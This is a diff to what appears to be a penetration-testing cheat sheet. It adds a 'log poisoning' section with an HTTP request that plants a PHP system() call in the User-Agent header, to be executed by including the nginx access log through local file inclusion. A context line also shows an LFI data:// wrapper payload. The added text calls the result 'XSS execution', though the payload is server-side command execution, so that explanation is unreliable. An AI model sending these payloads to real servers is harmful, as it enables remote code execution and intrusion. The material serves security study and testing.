@@ -160,6 +160,15 @@ http://domain/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
 ```
 > LFI can lead to RCE.
 
+## LOG POSIONING
+```http
+GET / HTTP/1.1
+Host: 127.0.0.1:1337
+User-Agent: <?php system('ls /');?>
+```
+> sending this request can write <?php system('ls /');?> to the log file (e.g. at var/log/nginx/access.log), when accessing the log file via LFI, this can lead to XSS execution
+
+
 ## COMMAND INJECTION PAYLOADS
 ### Linux
 ```bash
